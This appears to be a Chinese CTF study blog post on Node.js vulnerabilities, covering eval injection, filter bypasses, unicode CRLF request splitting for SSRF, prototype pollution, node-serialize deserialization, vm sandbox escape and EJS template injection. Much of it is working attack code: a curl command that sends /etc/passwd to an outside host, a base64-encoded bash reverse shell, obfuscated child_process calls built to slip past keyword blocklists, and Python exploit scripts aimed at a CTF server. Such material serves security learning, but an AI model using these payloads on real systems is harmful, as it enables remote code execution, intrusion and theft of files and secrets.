1 a \u0026amp;\u0026amp; b \u0026amp;\u0026amp; a.length===b.length \u0026amp;\u0026amp; a!==b \u0026amp;\u0026amp; md5(a+flag)===md5(b+flag) 跟php一样数组绕过\n1 a[x]=1\u0026amp;b[x]=2 1 2 3 4 a={\u0026#39;x\u0026#39;:\u0026#39;1\u0026#39;} b={\u0026#39;x\u0026#39;:\u0026#39;2\u0026#39;} console.log(a+\u0026#34;flag{xxx}\u0026#34;) console.log(b+\u0026#34;flag{xxx}\u0026#34;) 数组被解析为[object Object]\n编码绕过 16进制编码\n1 console.log(\u0026#34;a\u0026#34;===\u0026#34;\\x61\u0026#34;); // true unicode编码\n1 console.log(\u0026#34;\\u0061\u0026#34;===\u0026#34;a\u0026#34;); // true base编码\n1 eval(Buffer.from(\u0026#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7\u0026#39;,\u0026#39;base64\u0026#39;).toString()) 危险函数 eval() eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。\n简单例子：\nmain.js\n1 2 3 4 5 6 7 8 9 10 11 var express = require(\u0026#34;express\u0026#34;); var app = express(); app.get(\u0026#39;/eval\u0026#39;,function(req,res){ res.send(eval(req.query.q)); console.log(req.query.q); }) var server = app.listen(8888, function() { console.log(\u0026#34;应用实例，访问地址为 http://127.0.0.1:8888/\u0026#34;); }) 漏洞利用：\nNode.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require('child_process').exec('');来进行调用。\n弹计算器(windows)：\n1 /eval?q=require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;calc\u0026#39;); 读取文件(linux)：\n1 /eval?q=require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl -F \u0026#34;x=`cat /etc/passwd`\u0026#34; http://vps\u0026#39;);; 反弹shell(linux)：\n1 2 3 4 5 /eval?q=require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash\u0026#39;); YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/3333 0\u0026gt;\u0026amp;1 BASE64加密后的结果，直接调用会报错。 注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下) 如果上下文中没有require,则可以使用global.process.mainModule.constructor._load('child_process').exec('calc')来执行命令\n与它类似的函数 间隔两秒执行函数：\nsetInteval(some_function, 2000) 两秒后执行函数：\nsetTimeout(some_function, 2000); some_function处就类似于eval函数的参数\n输出HelloWorld：\nFunction(\u0026ldquo;console.log(\u0026lsquo;HelloWolrd\u0026rsquo;)\u0026rdquo;)() 类似于php中的create_function\n以上都可以导致命令执行\n文件读写 读\nreadFile()\n1 2 3 4 require(\u0026#39;fs\u0026#39;).readFile(\u0026#39;/etc/passwd\u0026#39;, \u0026#39;utf-8\u0026#39;, (err, data) =\u0026gt; { if (err) throw err; console.log(data); }); readFileSync()\n1 require(\u0026#39;fs\u0026#39;).readFileSync(\u0026#39;/etc/passwd\u0026#39;,\u0026#39;utf-8\u0026#39;) 写\nwriteFileSync()\n1 require(\u0026#39;fs\u0026#39;).writeFileSync(\u0026#39;input.txt\u0026#39;,\u0026#39;sss\u0026#39;); writeFile()\n1 require(\u0026#39;fs\u0026#39;).writeFile(\u0026#39;input.txt\u0026#39;,\u0026#39;test\u0026#39;,(err)=\u0026gt;{}) RCE-bypass 原payload\n1 require(\u0026#34;child_process\u0026#34;).execSync(\u0026#39;cat flag.txt\u0026#39;) 拼接绕过\n1 2 3 4 require(\u0026#34;child_process\u0026#34;)[\u0026#39;exe\u0026#39;%2b\u0026#39;cSync\u0026#39;](\u0026#39;cat flag.txt\u0026#39;) //(%2b就是+的url编码) require(\u0026#39;child_process\u0026#39;)[\u0026#34;exe\u0026#34;.concat(\u0026#34;cSync\u0026#34;)](\u0026#34;open /System/Applications/Calculator.app/\u0026#34;) 编码绕过\n1 2 3 require(\u0026#34;child_process\u0026#34;)[\u0026#34;\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\u0026#34;](\u0026#39;cat flag.txt\u0026#39;) require(\u0026#34;child_process\u0026#34;)[\u0026#34;\\u0065\\u0078\\u0065\\u0063\\u0053\\x79\\x6e\\x63\u0026#34;](\u0026#39;cat fl001g.txt\u0026#39;) eval(Buffer.from(\u0026#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==\u0026#39;,\u0026#39;base64\u0026#39;).toString()) //弹计算器 模板拼接\n1 require(\u0026#34;child_process\u0026#34;)[`${`${`exe`}cSync`}`](\u0026#39;open /System/Applications/Calculator.app/\u0026#39;） SSRF 通过拆分攻击实现的SSRF攻击-先知社区\n原理\n虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节\n1 2 3 4 5 \u0026gt; v = \u0026#34;/caf\\u{E9}\\u{01F436}\u0026#34; \u0026#39;/café🐶\u0026#39; \u0026gt; Buffer.from(v,\u0026#39;latin1\u0026#39;).toString(\u0026#39;latin1\u0026#39;) \u0026#39;/café=6\u0026#39; 利用crlf进行HTTP头注入\n1 2 \u0026gt; require(\u0026#39;http\u0026#39;).get(\u0026#39;http://example.com/\\r\\n/test\u0026#39;)._header \u0026#39;GET //test HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n\u0026#39; [GYCTF2020]Node Game 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 var express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var http = require(\u0026#39;http\u0026#39;); var pug = require(\u0026#39;pug\u0026#39;); var morgan = require(\u0026#39;morgan\u0026#39;); const multer = require(\u0026#39;multer\u0026#39;); app.use(multer({dest: \u0026#39;./dist\u0026#39;}).array(\u0026#39;file\u0026#39;)); app.use(morgan(\u0026#39;short\u0026#39;)); app.use(\u0026#34;/uploads\u0026#34;,express.static(path.join(__dirname, \u0026#39;/uploads\u0026#39;))) app.use(\u0026#34;/template\u0026#34;,express.static(path.join(__dirname, \u0026#39;/template\u0026#39;))) app.get(\u0026#39;/\u0026#39;, function(req, res) { var action = req.query.action?req.query.action:\u0026#34;index\u0026#34;; if( action.includes(\u0026#34;/\u0026#34;) || action.includes(\u0026#34;\\\\\u0026#34;) ){ res.send(\u0026#34;Errrrr, You have been Blocked\u0026#34;); } file = path.join(__dirname + \u0026#39;/template/\u0026#39;+ action +\u0026#39;.pug\u0026#39;); var html = pug.renderFile(file); res.send(html); }); app.post(\u0026#39;/file_upload\u0026#39;, function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: \u0026#39;\u0026#39;, } if (!ip.includes(\u0026#39;127.0.0.1\u0026#39;)) { obj.msg=\u0026#34;only admin\u0026#39;s ip can use it\u0026#34; res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = \u0026#39;upload failed\u0026#39;; res.send(JSON.stringify(obj)); }else{ var file_path = \u0026#39;/uploads/\u0026#39; + req.files[0].mimetype +\u0026#34;/\u0026#34;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \u0026#34;file type error\u0026#34;; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: \u0026#39;upload success\u0026#39;, filename: file_path + file_name } } catch (error) { obj.msg = \u0026#39;upload failed\u0026#39;; } res.send(JSON.stringify(obj)); } }) }) app.get(\u0026#39;/source\u0026#39;, function(req, res) { res.sendFile(path.join(__dirname + \u0026#39;/template/source.txt\u0026#39;)); }); app.get(\u0026#39;/core\u0026#39;, function(req, res) { var q = req.query.q; var resp = \u0026#34;\u0026#34;; if (q) { var url = \u0026#39;http://localhost:8081/source?\u0026#39; + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\u0026#34;\u0026lt;p\u0026gt;error occurs!\u0026lt;/p\u0026gt;\u0026#34;); } else { try { http.get(url, function(resp) { resp.setEncoding(\u0026#39;utf8\u0026#39;); resp.on(\u0026#39;error\u0026#39;, function(err) { if (err.code === \u0026#34;ECONNRESET\u0026#34;) { console.log(\u0026#34;Timeout occurs\u0026#34;); return; } }); resp.on(\u0026#39;data\u0026#39;, function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on(\u0026#39;error\u0026#39;, (e) =\u0026gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\u0026#34;search param \u0026#39;q\u0026#39; missing!\u0026#34;); } }) function blacklist(url) { var evilwords = [\u0026#34;global\u0026#34;, \u0026#34;process\u0026#34;,\u0026#34;mainModule\u0026#34;,\u0026#34;require\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;child_process\u0026#34;,\u0026#34;exec\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;!\u0026#34;]; var arrayLen = evilwords.length; for (var i = 0; i \u0026lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\u0026#34;Example app listening at http://%s:%s\u0026#34;, host, port) }) 这里\n1 var file_path = \u0026#39;/uploads/\u0026#39; + req.files[0].mimetype +\u0026#34;/\u0026#34;; 路径根据mimetype进行拼接,可以想到目录穿越\n控制bp里面Content-Type为../template,路径就为uploads/../template/+filename这样就相当于传了一个文件到template下\n先了解前面crlf的攻击原理\n假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：\n1 2 GET /private-api?q=\u0026lt;user-input-here\u0026gt; HTTP/1.1 Authorization: server-secret-key 如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：\n1 \u0026#34;x HTTP/1.1\\r\\n\\r\\nDELETE /private-api HTTP/1.1\\r\\n\u0026#34; 在发出请求时，服务器可能会直接将其写入路径，如下：\n1 2 3 4 GET /private-api?q=x HTTP/1.1 DELETE /private-api Authorization: server-secret-key 说到底就是\\r\\n成功生效\n接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE\n但是正常的HTTP库在nodejs会限制这种行为，如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码,但是上文我们提到可以用unicode来绕过\n1 2 3 4 \u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39; http://example.com/čĊ/test http.get(\u0026#39;http://example.com/\\u010D\\u010A/test\u0026#39;).output [ \u0026#39;GET /čĊ/test HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n\u0026#39; ] 当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符\n但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\\r”和“\\n”\n1 2 Buffer.from(\u0026#39;http://example.com/\\u{010D}\\u{010A}/test\u0026#39;, \u0026#39;latin1\u0026#39;).toString() \u0026#39;http://example.com/\\r\\n/test\u0026#39; 这题思路是\n1 2 3 1.对/core路由发起切分攻击，请求/core的同时还向/source路由发出上传文件的请求 2.由于/路由是先读取/template/目录下的pug文件再将其渲染到当前界面，因此应该上传包含命令执行的pug文件；文件虽然默认上传至/upload/目录下，但可以通过目录穿越将文件上传到/template目录 3.访问上传到/template目录下包含命令执行的pug文件 先写好pug文件,拼接绕过黑名单\n1 2 -var x = eval(\u0026#34;glob\u0026#34;+\u0026#34;al.proce\u0026#34;+\u0026#34;ss.mainMo\u0026#34;+\u0026#34;dule.re\u0026#34;+\u0026#34;quire(\u0026#39;child_\u0026#39;+\u0026#39;pro\u0026#39;+\u0026#39;cess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;ls /\u0026#39;).toString()\u0026#34;) -return x 抓包获得请求包\n复制下来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Content-Type: multipart/form-data; boundary=----geckoformboundary3f02d5d68531cb3f111ca7a9cef0f9e8 Content-Length: 357 Origin: http://b0eba7e3-0d85-40aa-b5f1-c076b0375848.node5.buuoj.cn:81 Connection: keep-alive Referer: http://b0eba7e3-0d85-40aa-b5f1-c076b0375848.node5.buuoj.cn:81/?action=upload Upgrade-Insecure-Requests: 1 Priority: u=0, i ------geckoformboundary3f02d5d68531cb3f111ca7a9cef0f9e8 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;shell.pug\u0026#34; Content-Type: ../tempelate -var x = eval(\u0026#34;glob\u0026#34;+\u0026#34;al.proce\u0026#34;+\u0026#34;ss.mainMo\u0026#34;+\u0026#34;dule.re\u0026#34;+\u0026#34;quire(\u0026#39;child_\u0026#39;+\u0026#39;pro\u0026#39;+\u0026#39;cess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;ls /\u0026#39;).toString()\u0026#34;) -return x ------geckoformboundary3f02d5d68531cb3f111ca7a9cef0f9e8-- 然后上脚本把包改了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import urllib.parse import requests payload = \u0026#39;\u0026#39;\u0026#39; HTTP/1.1 POST /file_upload HTTP/1.1 Content-Type: multipart/form-data; boundary=---------------------------41671423531508392532090664957 Content-Length: 350 -----------------------------41671423531508392532090664957 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;shell.pug\u0026#34; Content-Type: ../template -var x = eval(\u0026#34;glob\u0026#34;+\u0026#34;al.proce\u0026#34;+\u0026#34;ss.mainMo\u0026#34;+\u0026#34;dule.re\u0026#34;+\u0026#34;quire(\u0026#39;child_\u0026#39;+\u0026#39;pro\u0026#39;+\u0026#39;cess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;ls /\u0026#39;).toString()\u0026#34;) -return x -----------------------------41671423531508392532090664957-- GET /flag HTTP/1.1 x:\u0026#39;\u0026#39;\u0026#39; payload = payload.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) payload = \u0026#39;\u0026#39;.join(chr(int(\u0026#39;0xff\u0026#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(payload) r = requests.get(\u0026#39;http://b0eba7e3-0d85-40aa-b5f1-c076b0375848.node5.buuoj.cn:81/core?q=\u0026#39; + urllib.parse.quote(payload)) print(r.text) 这个成功概率很小不知道为什么\n然后看flag.txt,换一个脚本,这里直接手动换unicode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests payload = \u0026#34;\u0026#34;\u0026#34; HTTP/1.1 Host: 127.0.0.1 Connection: keep-alive POST /file_upload HTTP/1.1 Host: 127.0.0.1 Content-Length: {} Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUlQgK81vgN7OB8A {}\u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) body = \u0026#34;\u0026#34;\u0026#34;------WebKitFormBoundaryZUlQgK81vgN7OB8A Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;shell.pug\u0026#34; Content-Type: ../template -var x = eval(\u0026#34;glob\u0026#34;+\u0026#34;al.proce\u0026#34;+\u0026#34;ss.mainMo\u0026#34;+\u0026#34;dule.re\u0026#34;+\u0026#34;quire(\u0026#39;child_\u0026#39;+\u0026#39;pro\u0026#39;+\u0026#39;cess\u0026#39;)[\u0026#39;ex\u0026#39;+\u0026#39;ecSync\u0026#39;](\u0026#39;cat /flag.txt\u0026#39;).toString()\u0026#34;) -return x ------WebKitFormBoundaryZUlQgK81vgN7OB8A-- \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) payload = payload.format(len(body), body) \\ .replace(\u0026#39;+\u0026#39;, \u0026#39;\\u012b\u0026#39;) \\ .replace(\u0026#39; \u0026#39;, \u0026#39;\\u0120\u0026#39;) \\ .replace(\u0026#39;\\r\\n\u0026#39;, \u0026#39;\\u010d\\u010a\u0026#39;) \\ .replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;\\u0122\u0026#39;) \\ .replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#39;\\u0a27\u0026#39;) \\ .replace(\u0026#39;[\u0026#39;, \u0026#39;\\u015b\u0026#39;) \\ .replace(\u0026#39;]\u0026#39;, \u0026#39;\\u015d\u0026#39;) \\ + \u0026#39;GET\u0026#39; + \u0026#39;\\u0120\u0026#39; + \u0026#39;/\u0026#39; requests.get(\u0026#39;http://b0eba7e3-0d85-40aa-b5f1-c076b0375848.node5.buuoj.cn:81/core?q=\u0026#39; + payload) print(requests.get(\u0026#39;http://b0eba7e3-0d85-40aa-b5f1-c076b0375848.node5.buuoj.cn:81/?action=shell\u0026#39;).text) 原型链污染 原理之前学过了，看看例题\n[GYCTF2020]Ez_Express 源码泄露，有www.zip\n看源码有merge，直接想到打原型链污染\n1 2 3 4 5 6 7 8 9 10 11 12 13 const merge = (a, b) =\u0026gt; { for (var attr in b) { if (isObject(a[attr]) \u0026amp;\u0026amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } const clone = (a) =\u0026gt; { return merge({}, a); } 然后这里登入会把用户名转大写写进session\n1 2 3 4 5 req.session.user={ \u0026#39;user\u0026#39;:req.body.userid.toUpperCase(), \u0026#39;passwd\u0026#39;: req.body.pwd, \u0026#39;isLogin\u0026#39;:false } 但是不让以admin注册，要求ADMIN为用户名，用到上面大小写特性了\n1 2 3 4 5 6 7 8 9 10 11 12 13 function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } router.post(\u0026#39;/action\u0026#39;, function (req, res) { if(req.session.user.user!=\u0026#34;ADMIN\u0026#34;){res.end(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;ADMIN is asked\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt;\u0026#34;)} req.session.user.data = clone(req.body); res.end(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;success\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt;\u0026#34;); }); admin 写成 admın 即可绕过上面的限制了\n然后/action路由直接用常用payload就污染了\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;cat /flag\u0026#39;);var __tmp2\u0026#34;}} 发包类型改为json\n然后访问info路由触发污染，界面无回显，我们写文件到当前目录下\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;cat /flag \u0026gt;/app/public/abc\u0026#39;);var __tmp2\u0026#34;}} 然后再访问abc路由，得到flag\nnode-serialize反序列化RCE漏洞(CVE-2017-5941) 漏洞出现在node-serialize模块0.0.4版本当中，使用npm install node-serialize@0.0.4安装模块。\n了解什么是IIFE： IIFE（立即调用函数表达式）是一个在定义时就会立即执行的 JavaScript 函数。\nIIFE一般写成下面的形式：\n1 2 3 (function(){ /* code */ }()); // 或者 (function(){ /* code */ })(); 漏洞点\n漏洞代码位于node_modules\\node-serialize\\lib\\serialize.js中：\n其中的关键就是：obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function(){}()函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload\n构造Payload 1 2 3 4 5 serialize = require(\u0026#39;node-serialize\u0026#39;); var test = { rce : function(){require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls /\u0026#39;,function(error, stdout, stderr){console.log(stdout)});}, } console.log(\u0026#34;序列化生成的 Payload: \\n\u0026#34; + serialize.serialize(test)); 生成的payload\n1 {\u0026#34;rce\u0026#34;:\u0026#34;_$$ND_FUNC$$_function(){require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls /\u0026#39;,function(error, stdout, stderr){console.log(stdout)});}\u0026#34;} 因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下：\n1 {\u0026#34;rce\u0026#34;:\u0026#34;_$$ND_FUNC$$_function(){require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls /\u0026#39;,function(error, stdout, stderr){console.log(stdout)});}()\u0026#34;} 传递给unserialize(注意转义单引号)：\n1 2 3 var serialize = require(\u0026#39;node-serialize\u0026#39;); var payload = \u0026#39;{\u0026#34;rce\u0026#34;:\u0026#34;_$$ND_FUNC$$_function(){require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;ls /\\\u0026#39;,function(error, stdout, stderr){console.log(stdout)});}()\u0026#34;}\u0026#39;; serialize.unserialize(payload); Node.js 目录穿越漏洞复现(CVE-2017-14849) 漏洞影响的版本：\nNode.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5 用Burpsuite获取地址：/static/../../../a/../../../../etc/passwd 即可下载得到/etc/passwd文件\n详细分析见Node.js CVE-2017-14849 漏洞分析 - 博客 - 腾讯安全应急响应中心\nvm沙箱逃逸 vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸\n逃逸例子：\n1 2 3 const vm = require(\u0026#34;vm\u0026#34;); const env = vm.runInNewContext(`this.constructor.constructor(\u0026#39;return this.process.env\u0026#39;)()`); console.log(env); 执行之后可以获取到主程序环境中的环境变量\n上面例子的代码等价于如下代码：\n1 2 3 4 5 6 const vm = require(\u0026#39;vm\u0026#39;); const sandbox = {}; const script = new vm.Script(\u0026#34;this.constructor.constructor(\u0026#39;return this.process.env\u0026#39;)()\u0026#34;); const context = vm.createContext(sandbox); env = script.runInContext(context); console.log(env); 创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。\n因为this.constructor.constructor返回的是一个Function constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。\n配合child_process.exec()就可以执行任意命令了\n1 2 3 4 const vm = require(\u0026#34;vm\u0026#34;); const env = vm.runInNewContext(`const process = this.constructor.constructor(\u0026#39;return this.process\u0026#39;)(); process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;).toString()`); console.log(env); ","date":"2025-04-11T00:00:00Z","image":"https://0d000721999.github.io/p/nodejs%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/1.jpg","permalink":"https://0d000721999.github.io/p/nodejs%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","title":"nodejs常见漏洞学习"},{"content":"ejs模板引擎和jade模板引擎实现RCE 参考：Ejs模板引擎注入实现RCE-先知社区\nEJS是一个javascript模板库，用来从json数据中生成HTML字符串\n功能：缓存功能，能够缓存好的HTML模板； \u0026lt;% code %\u0026gt;用来执行javascript代码 安装： 1 $ npm install ejs 基础用法 1 2 3 4 5 6 7 8 9 //1.js var ejs = require(\u0026#39;ejs\u0026#39;); var fs = require(\u0026#39;fs\u0026#39;); var data = fs.readFileSync(\u0026#39;1.ejs\u0026#39;); var result = ejs.render(data.toString()); console.log(result);//123 //1.ejs \u0026lt;% var a=123 %\u0026gt; \u0026lt;% console.log(a); %\u0026gt; 或者\n1 2 3 4 5 6 var ejs = require(\u0026#39;ejs\u0026#39;); //var fs = require(\u0026#39;fs\u0026#39;); //var data = fs.readFileSync(\u0026#39;1.ejs\u0026#39;); //var result = ejs.render(data.toString()); var result = ejs.render(\u0026#39;\u0026lt;% var a = 123 %\u0026gt;\u0026lt;% console.log(a); %\u0026gt;\u0026#39;); console.log(result); 插值语句 1 2 3 4 5 \u0026lt;%= 变量名 %\u0026gt; if else 语句 \u0026lt;% if(条件){ %\u0026gt; html代码 \u0026lt;% } %\u0026gt; 实例\n1 2 3 4 5 6 7 8 9 \u0026lt;body\u0026gt; \u0026lt;% if (state === \u0026#39;danger\u0026#39;) { %\u0026gt; \u0026lt;p\u0026gt;危险区域, 请勿进入\u0026lt;/p\u0026gt; \u0026lt;% } else if (state === \u0026#39;warning\u0026#39;) { %\u0026gt; \u0026lt;p\u0026gt;警告, 你即将进入危险区域\u0026lt;/p\u0026gt; \u0026lt;% } else { %\u0026gt; \u0026lt;p\u0026gt;状态安全\u0026lt;/p\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/body\u0026gt; 循环语句 1 2 3 \u0026lt;% arr.foreach((item,index)=\u0026gt;{ %\u0026gt; html代码 \u0026lt;% }) %\u0026gt; 实例\n1 2 3 4 5 6 7 8 \u0026lt;body\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;% for(var i = 0; i \u0026lt; users.length; i++) { %\u0026gt; \u0026lt;% var user = users[i]; %\u0026gt; \u0026lt;li\u0026gt;\u0026lt;%= user %\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;% } %\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt; 渲染页面 ejs.compile(str,[option])\n编译字符串得到模板函数，参数如下\n1 2 3 4 5 6 str：需要解析的字符串模板 option：配置选项 var template = ejs.compile(\u0026#39;\u0026lt;%=123 %\u0026gt;\u0026#39;); var result = template(); console.log(result); //123 ejs.render(str,data,[option])\n直接渲染字符串并生成html，参数如下\n1 2 3 4 5 6 str：需要解析的字符串模板 data：数据 option：配置选项 var result = ejs.render(\u0026#39;\u0026lt;%=123 %\u0026gt;\u0026#39;); console.log(result); //123 变量 用\u0026lt;%=...%\u0026gt;输出变量，变量若包含 '\u0026lt;' '\u0026gt;' '\u0026amp;'等字符会被转义\n1 2 3 4 var ejs = require(\u0026#39;ejs\u0026#39;); var result = ejs.render(\u0026#39;\u0026lt;%=a%\u0026gt;\u0026#39;,{a:\u0026#39;\u0026lt;div\u0026gt;123\u0026lt;/div\u0026gt;\u0026#39;}); console.log(result); //\u0026amp;lt;div\u0026amp;gt;123\u0026amp;lt;/div\u0026amp;gt; 如果不希望变量值的内容被转义，那就这么用\u0026lt;%-... %\u0026gt;输出变量\n1 2 3 4 var ejs = require(\u0026#39;ejs\u0026#39;); var result = ejs.render(\u0026#39;\u0026lt;%-a%\u0026gt;\u0026#39;,{a:\u0026#39;\u0026lt;div\u0026gt;123\u0026lt;/div\u0026gt;\u0026#39;}); console.log(result); //\u0026lt;div\u0026gt;123\u0026lt;/div\u0026gt; 注释 用\u0026lt;%# some comments %\u0026gt;来注释，不执行不输出\n文件包含 include可以引用绝对路径或相对路径的模板文件\n1 2 3 4 5 6 7 8 //test.ejs \u0026lt;% var a = 123 %\u0026gt; \u0026lt;% console.log(a); %\u0026gt; //test.js var ejs = require(\u0026#39;ejs\u0026#39;); var result = ejs.render(\u0026#39;\u0026lt;% include test.ejs %\u0026gt;\u0026#39;); //throw new Error(\u0026#39;`include` use relative path requires the \\\u0026#39;filename\\\u0026#39; option.\u0026#39;); console.log(result); 由上面的提示可知，使用相对路径时，必须设置'filename'选项\n1 2 3 4 5 6 7 8 //test.ejs \u0026lt;% var a = 123 %\u0026gt; \u0026lt;% console.log(a); %\u0026gt; //test.js var ejs = require(\u0026#39;ejs\u0026#39;); var result = ejs.render(\u0026#39;\u0026lt;% include test.ejs %\u0026gt;\u0026#39;,{filename:\u0026#39;test.ejs\u0026#39;}); console.log(result); //123 CVE-2022-29078 SSTI分析 NodeJS 的 EJS（嵌入式 JavaScript 模板）版本 3.1.6 或更早版本中存在 SSTI（服务器端模板注入）漏洞。\n该漏洞settings[view options][outputFunctionName]在EJS渲染成HTML时，用浅拷贝覆盖值，最后插入OS Command导致RCE。\n复现 环境\n1 2 npm install ejs@3.1.6 npm install express app.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 const express = require(\u0026#39;express\u0026#39;); const app = express(); const PORT = 3000; app.set(\u0026#39;views\u0026#39;, __dirname); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;, req.query); }); app.listen(PORT, ()=\u0026gt; { console.log(`Server is 